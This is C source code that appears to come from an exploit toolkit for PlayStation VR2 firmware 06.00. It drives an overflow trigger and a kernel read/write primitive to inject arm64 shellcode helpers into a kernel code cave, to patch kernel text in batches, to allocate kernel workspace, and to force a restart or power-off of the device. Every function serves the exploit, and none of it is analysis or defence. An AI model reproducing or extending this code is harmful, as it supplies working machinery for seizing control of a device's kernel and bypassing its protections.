#include "psvr2/kernel_exec.h"
#include "firmware_0600_internal.h"

#include "kernel_bootstrap_internal.h"

#include "psvr2/arm64.h"

#include <string.h>

#define KERNEL_POINTER_MASK UINT64_C(0xffffffff00000000)
#define KERNEL_POINTER_PREFIX UINT64_C(0xffffffc000000000)
#define TEXT_PATCH_VERIFY_CAPACITY 256U
#define BATCH_PATCH_WORKSPACE_OFFSET UINT64_C(0x200)

_Static_assert(PSVR2_TEXT_CAVE_START <= PSVR2_STR_SC,
               "STR helper must be inside the text cave");
_Static_assert(PSVR2_STR_SC + PSVR2_STR_HELPER_SIZE <= PSVR2_EXEC_SC,
               "STR and trigger ranges overlap");
_Static_assert(PSVR2_EXEC_SC + PSVR2_UMH_TRIGGER_SIZE <= PSVR2_WORK_SC,
               "trigger and deferred-work ranges overlap");
_Static_assert(PSVR2_WORK_SC + PSVR2_UMH_WORKER_SIZE <= PSVR2_ALLOC_SC,
               "deferred-work and allocator ranges overlap");
_Static_assert(PSVR2_ALLOC_SC + PSVR2_ALLOC_HELPER_SIZE <= PSVR2_FREE_SC,
               "allocator and reserved free ranges overlap");
_Static_assert(PSVR2_DIRECT_CONTEXT_SC + PSVR2_DIRECT_CONTEXT_SC_SIZE <=
                   PSVR2_WORKSPACE_SLOT,
               "direct-context helper overlaps runtime metadata");
_Static_assert(PSVR2_WORKSPACE_SLOT + 8 <= PSVR2_TEXT_CAVE_END,
               "workspace metadata must be inside the text cave");
_Static_assert(PSVR2_WORKSPACE_SLOT + 8 <= PSVR2_BATCH_PATCH_SC,
               "batch patch helper overlaps runtime metadata");
_Static_assert(PSVR2_BATCH_PATCH_SC + PSVR2_BATCH_PATCH_SC_SIZE <=
                   PSVR2_DIRECT_READ_SC,
               "batch patch and direct-read helpers overlap");
_Static_assert(PSVR2_DIRECT_READ_SC + PSVR2_DIRECT_READ_SC_SIZE <=
                   PSVR2_PATCH_SC,
               "direct-read and single-word patch helpers overlap");
_Static_assert(PSVR2_PATCH_SC >= PSVR2_WORKSPACE_SLOT + 8,
               "patch helper overlaps runtime metadata");
_Static_assert(PSVR2_PATCH_SC + PSVR2_PATCH_SC_SIZE <=
                   PSVR2_TLBI_CLEANUP_SC,
               "patch helper and TLBI cleanup overlap");
_Static_assert(PSVR2_TLBI_CLEANUP_SC + PSVR2_TLBI_CLEANUP_SIZE <=
                   PSVR2_COLD_CLEANUP_SC,
               "TLBI cleanup must be inside the text cave");
_Static_assert(PSVR2_COLD_CLEANUP_SC + PSVR2_COLD_CLEANUP_SIZE <=
                   PSVR2_RECOVERY_SC,
               "cold cleanup must be inside the text cave");
_Static_assert(PSVR2_RECOVERY_SC + PSVR2_RECOVERY_SC_SIZE <=
                   PSVR2_TEXT_CAVE_END,
               "recovery helper must be inside the text cave");

static bool range_within(uint64_t target, size_t length,
                         uint64_t start, size_t capacity) {
    return target >= start &&
           length <= capacity &&
           target - start <= capacity - length;
}

static bool certified_patch_range(
    const psvr2_constants *constants,
    uint64_t target, size_t length) {
    const psvr2_firmware_profile *fw = &constants->fw;
    return range_within(
               target, length, fw->str_helper,
               PSVR2_STR_HELPER_SIZE) ||
           range_within(
               target, length, fw->umh_trigger,
               PSVR2_UMH_TRIGGER_SIZE) ||
           range_within(
               target, length, fw->umh_worker,
               PSVR2_UMH_WORKER_SIZE) ||
           range_within(
               target, length, fw->alloc_helper,
               PSVR2_ALLOC_HELPER_SIZE) ||
           range_within(
               target, length, fw->free_helper,
               PSVR2_DIRECT_CONTEXT_SC_SIZE) ||
           range_within(target, length, fw->workspace_slot, 8) ||
           range_within(
               target, length, fw->batch_patch_helper,
               PSVR2_BATCH_PATCH_SC_SIZE) ||
           range_within(
               target, length, fw->direct_read_helper,
               PSVR2_DIRECT_READ_SC_SIZE) ||
           range_within(
               target, length, fw->patch_helper,
               PSVR2_PATCH_SC_SIZE) ||
           range_within(
               target, length, fw->tlbi_cleanup_helper,
               PSVR2_TLBI_CLEANUP_SIZE) ||
           range_within(
               target, length, fw->cold_cleanup_helper,
               PSVR2_COLD_CLEANUP_SIZE) ||
           range_within(
               target, length, fw->text_cave_end - UINT64_C(0x20),
               PSVR2_RECOVERY_SC_SIZE);
}

static bool exact_text_mapping(psvr2_krw *krw) {
    psvr2_pte mapping;
    if (!psvr2_get_pte_ex(
            krw, krw->ex->constants->fw.text_cave_start,
            &mapping, true, false))
        return false;
    unsigned access = (unsigned)((mapping.value >> 6) & 3U);
    bool privileged_execute_never =
        ((mapping.value >> 53) & 1U) != 0;
    return mapping.level == PSVR2_PTE_L2_BLOCK &&
           access == 2U && !privileged_execute_never;
}

static bool text_patch_request_valid(
    const psvr2_constants *constants,
    uint64_t target, size_t length) {
    return (target & 3U) == 0 &&
           length && (length & 3U) == 0 &&
           length <= TEXT_PATCH_VERIFY_CAPACITY &&
           certified_patch_range(constants, target, length);
}

static bool text_patch_context_ready(psvr2_krw *krw) {
    if (!krw || !krw->ex || !krw->ex->constants ||
        !krw->regs.valid || !krw->spinlock ||
        !psvr2_constants_shellcode_execution_safe(krw->ex->constants) ||
        !exact_text_mapping(krw) ||
        !psvr2_kernel_exact_execution_anchors(krw) ||
        !psvr2_kernel_bootstrap_helpers(krw))
        return false;
    return true;
}

static bool text_patch_word(
    psvr2_krw *krw, uint64_t target, uint32_t instruction) {
    uint32_t before;
    if (!psvr2_kernel_read_u32_nonfatal(krw, target, &before))
        return false;
    if (before == instruction) return true;
    if (before != 0) return false;
    return psvr2_kernel_patch_word_with_helper(
        krw, target, instruction);
}

static bool text_patch_target_owned(
    psvr2_krw *krw, uint64_t target,
    const uint8_t *data, size_t length, bool *complete) {
    uint8_t observed[TEXT_PATCH_VERIFY_CAPACITY];
    if (!complete ||
        !psvr2_krw_read_ex(
            krw, target, observed, length, true, false))
        return false;

    *complete = true;
    for (size_t offset = 0; offset < length; offset += 4) {
        uint32_t before = psvr2_load_le32(observed + offset);
        uint32_t wanted = psvr2_load_le32(data + offset);
        if (before != 0 && before != wanted)
            return false;
        if (before != wanted)
            *complete = false;
    }
    return true;
}

static bool write_batch_source(
    psvr2_krw *krw, uint64_t scratch,
    const uint8_t *data, size_t length,
    uint8_t expected[TEXT_PATCH_VERIFY_CAPACITY],
    size_t *staged_size) {
    size_t padded = (length + 7U) & ~(size_t)7U;
    *staged_size = padded;
    memset(expected, 0, *staged_size);
    memcpy(expected, data, length);

    for (size_t offset = 0; offset < *staged_size; offset += 8)
        if (!psvr2_krw_write_u64_fast(
                krw, scratch + offset,
                psvr2_load_le64(expected + offset)))
            return false;

    uint8_t observed[TEXT_PATCH_VERIFY_CAPACITY];
    return psvr2_krw_read_ex(
               krw, scratch, observed, *staged_size, true, false) &&
           memcmp(observed, expected, *staged_size) == 0;
}

static bool clear_probe_scratch(
    psvr2_krw *krw, uint64_t scratch, size_t staged_size) {
    bool cleared = true;
    for (size_t offset = 0; offset < staged_size; offset += 8)
        cleared =
            psvr2_krw_write_u64_fast(
                krw, scratch + offset, UINT64_MAX) &&
            cleared;
    return cleared && psvr2_kernel_probe_slot_is_pristine(krw);
}

static bool text_patch_apply_staged(
    psvr2_krw *krw, uint64_t target,
    const uint8_t *data, size_t length) {
    psvr2_constants *constants = krw->ex->constants;
    bool complete = false;
    if (!text_patch_target_owned(
            krw, target, data, length, &complete))
        return false;
    if (complete) return true;

    bool temporary =
        !psvr2_constants_runtime_workspace_safe(constants);
    uint64_t scratch =
        temporary
            ? constants->fw.kernel_probe_byte
            : constants->runtime_data + BATCH_PATCH_WORKSPACE_OFFSET;
    size_t required = (length + 7U) & ~(size_t)7U;
    if (temporary && required > PSVR2_TEMP_HELPER_SIZE)
        return false;
    if (temporary &&
        !psvr2_kernel_probe_slot_is_pristine(krw))
        return false;

    uint8_t expected[TEXT_PATCH_VERIFY_CAPACITY];
    size_t staged_size = 0;
    bool staged = write_batch_source(
        krw, scratch, data, length, expected, &staged_size);
    if (!staged) {
        if (temporary)
            (void)clear_probe_scratch(krw, scratch, staged_size);
        return false;
    }

    uint8_t payload[PSVR2_WRITE_PAYLOAD_SIZE];
    psvr2_build_fast_write_payload(
        constants, payload, target, scratch,
        krw->spinlock,
        (uint64_t)krw->regs.x22 | ((uint64_t)(length / 4U) << 8),
        constants->fw.batch_patch_helper);
    (void)psvr2_krw_trigger_overflow(
        krw, payload, sizeof(payload), 2500);

    bool scratch_restored =
        !temporary ||
        clear_probe_scratch(krw, scratch, staged_size);
    uint8_t verify[TEXT_PATCH_VERIFY_CAPACITY];
    return scratch_restored &&
           psvr2_krw_read_ex(
               krw, target, verify, length, true, false) &&
           memcmp(verify, data, length) == 0;
}

static bool text_patch_apply(
    psvr2_krw *krw, uint64_t target,
    const void *data, size_t length) {
    if (length >= 8)
        return text_patch_apply_staged(
            krw, target, data, length);

    const uint8_t *bytes = data;
    for (size_t offset = length; offset != 0; offset -= 4) {
        size_t word_offset = offset - 4;
        if (!text_patch_word(
                krw, target + word_offset,
                psvr2_load_le32(bytes + word_offset)))
            return false;
    }

    uint8_t verify[TEXT_PATCH_VERIFY_CAPACITY];
    return psvr2_krw_read_ex(
               krw, target, verify, length, true, false) &&
           memcmp(verify, data, length) == 0;
}

bool psvr2_kernel_text_patch_u32(
    psvr2_krw *krw, uint64_t target, uint32_t instruction) {
    return krw && krw->ex && krw->ex->constants &&
           text_patch_request_valid(
               krw->ex->constants, target, 4) &&
           text_patch_context_ready(krw) &&
           text_patch_word(krw, target, instruction);
}

bool psvr2_kernel_text_patch(
    psvr2_krw *krw, uint64_t target,
    const void *data, size_t length) {
    return krw && krw->ex && krw->ex->constants && data &&
           text_patch_request_valid(
               krw->ex->constants, target, length) &&
           text_patch_context_ready(krw) &&
           text_patch_apply(krw, target, data, length);
}

bool psvr2_kernel_text_patch_many(
    psvr2_krw *krw,
    const psvr2_kernel_text_patch_request *requests,
    size_t request_count) {
    if (!krw || !krw->ex || !krw->ex->constants ||
        !requests || !request_count) return false;
    for (size_t index = 0; index < request_count; ++index)
        if (!requests[index].data ||
            !text_patch_request_valid(
                krw->ex->constants, requests[index].target,
                requests[index].length))
            return false;
    double total_started = psvr2_now();
    double started = psvr2_now();
    bool ready = text_patch_context_ready(krw);
    psvr2_report_timing(
        "text-patch context validation", started, ready);
    if (!ready) {
        psvr2_report_timing(
            "text-patch batch total", total_started, false);
        return false;
    }
    for (size_t index = 0; index < request_count; ++index) {
        started = psvr2_now();
        bool applied = text_patch_apply(
            krw, requests[index].target,
            requests[index].data, requests[index].length);
        char label[96];
        (void)snprintf(
            label, sizeof(label),
            "text patch %zu/%zu at 0x%llx (%zu bytes)",
            index + 1U, request_count,
            (unsigned long long)requests[index].target,
            requests[index].length);
        psvr2_report_timing(label, started, applied);
        if (!applied) {
            psvr2_report_timing(
                "text-patch batch total", total_started, false);
            return false;
        }
    }
    psvr2_report_timing(
        "text-patch batch total", total_started, true);
    return true;
}

static bool valid_workspace_pointer(
    const psvr2_constants *constants, uint64_t address) {
    return (address & KERNEL_POINTER_MASK) == KERNEL_POINTER_PREFIX &&
           address >= constants->fw.kernel_image_end &&
           (address & UINT64_C(0xf)) == 0;
}

static bool reuse_workspace_allocation(
    psvr2_runtime *runtime, psvr2_constants *constants) {
    uint8_t stored_pointer[8];
    if (!psvr2_krw_read_ex(
            runtime->krw, constants->fw.workspace_slot, stored_pointer,
            sizeof(stored_pointer), true, false))
        return false;

    uint64_t existing = psvr2_load_le64(stored_pointer);
    if (!valid_workspace_pointer(constants, existing))
        return false;

    constants->runtime_work = existing;
    constants->runtime_data =
        existing + PSVR2_RUNTIME_DATA_OFFSET;
    if (!psvr2_constants_runtime_workspace_safe(constants))
        return false;
    return true;
}

static bool allocate_workspace(
    psvr2_runtime *runtime, psvr2_constants *constants) {
    psvr2_krw *krw = runtime->krw;
    if (!runtime->workspace_allocator_injected) {
        uint8_t allocator[PSVR2_ALLOC_HELPER_SIZE];
        if (!psvr2_build_workspace_allocator(constants, allocator) ||
            !psvr2_kernel_text_patch(
                krw, constants->fw.alloc_helper,
                allocator, sizeof(allocator)))
            return false;
        runtime->workspace_allocator_injected = true;
        psvr2_runtime_mark_phase(
            runtime, PSVR2_RUNTIME_HELPERS_READY);
    }

    uint8_t payload[PSVR2_WRITE_PAYLOAD_SIZE];
    psvr2_build_fast_write_payload(
        constants, payload, constants->fw.workspace_slot,
        PSVR2_RUNTIME_WORKSPACE_SIZE,
        krw->spinlock, krw->regs.x22,
        constants->fw.alloc_helper);
    bool sent = psvr2_krw_trigger_overflow(
        krw, payload, sizeof(payload), 2500);

    uint8_t result[8];
    bool read_ok = false;
    uint64_t allocation = 0;
    for (unsigned attempt = 0; attempt < 3; ++attempt) {
        read_ok = psvr2_krw_read_ex(
            krw, constants->fw.workspace_slot,
            result, sizeof(result), true, false);
        allocation = read_ok ? psvr2_load_le64(result) : 0;
        if (valid_workspace_pointer(constants, allocation))
            break;
    }
    if (!sent || !read_ok ||
        !valid_workspace_pointer(constants, allocation))
        return false;

    constants->runtime_work = allocation;
    constants->runtime_data =
        allocation + PSVR2_RUNTIME_DATA_OFFSET;
    bool safe =
        psvr2_constants_runtime_workspace_safe(constants);
    if (safe)
        psvr2_runtime_mark_phase(
            runtime, PSVR2_RUNTIME_WORKSPACE_READY);
    return safe;
}

bool psvr2_kernel_workspace_prepare(psvr2_runtime *runtime) {
    if (!runtime || !runtime->krw ||
        !runtime->krw->ex || !runtime->krw->ex->constants)
        return false;

    psvr2_constants *constants =
        runtime->krw->ex->constants;
    if (!psvr2_constants_shellcode_execution_safe(constants))
        return false;
    if (psvr2_constants_runtime_workspace_safe(constants))
        return true;
    if (reuse_workspace_allocation(runtime, constants))
        return true;
    return allocate_workspace(runtime, constants);
}

static bool kernel_force_terminal_action(
    psvr2_runtime *runtime, uint64_t target) {
    if (!runtime || !runtime->krw || !runtime->krw->ex ||
        !runtime->krw->ex->constants ||
        !runtime->krw->spinlock || !runtime->krw->regs.valid)
        return false;

    const psvr2_firmware_profile *fw =
        &runtime->krw->ex->constants->fw;
    uint64_t recovery = fw->text_cave_end - UINT64_C(0x20);

    uint8_t helper[PSVR2_RECOVERY_SC_SIZE] = {0};
    uint32_t instruction;
    psvr2_store_le32(
        helper + 0, UINT32_C(0xaa1f03e0)); /* mov x0,xzr */
    if (!psvr2_arm64_branch(
            recovery + 4,
            target, true, &instruction))
        return false;
    psvr2_store_le32(helper + 4, instruction);
    if (!psvr2_arm64_branch(
            recovery + 8, fw->clean_return,
            false, &instruction))
        return false;
    psvr2_store_le32(helper + 8, instruction);
    psvr2_store_le32(
        helper + 12, UINT32_C(0xd503201f)); /* nop */

    if (!psvr2_kernel_text_patch(
            runtime->krw, recovery,
            helper, sizeof(helper)))
        return false;

    uint8_t payload[PSVR2_WRITE_PAYLOAD_SIZE];
    if (psvr2_build_fast_write_payload(
            runtime->krw->ex->constants, payload,
            0, 0, runtime->krw->spinlock,
            runtime->krw->regs.x22,
            recovery) != sizeof(payload))
        return false;

    /*
     * Both terminal actions deliberately skip graceful device shutdown and
     * normally drop USB before the control transfer can complete, so
     * delivery—not a USB success status—is the meaningful result.
     */
    bool attempted = false;
    (void)psvr2_krw_trigger_overflow_ex(
        runtime->krw, payload, sizeof(payload), 2500, &attempted);
    return attempted;
}

bool psvr2_kernel_force_restart(psvr2_runtime *runtime) {
    if (!runtime || !runtime->krw || !runtime->krw->ex ||
        !runtime->krw->ex->constants)
        return false;
    return kernel_force_terminal_action(
        runtime,
        runtime->krw->ex->constants->fw.emergency_restart);
}

bool psvr2_kernel_force_power_off(psvr2_runtime *runtime) {
    if (!runtime || !runtime->krw || !runtime->krw->ex ||
        !runtime->krw->ex->constants)
        return false;
    return kernel_force_terminal_action(
        runtime,
        runtime->krw->ex->constants->fw.machine_power_off);
}
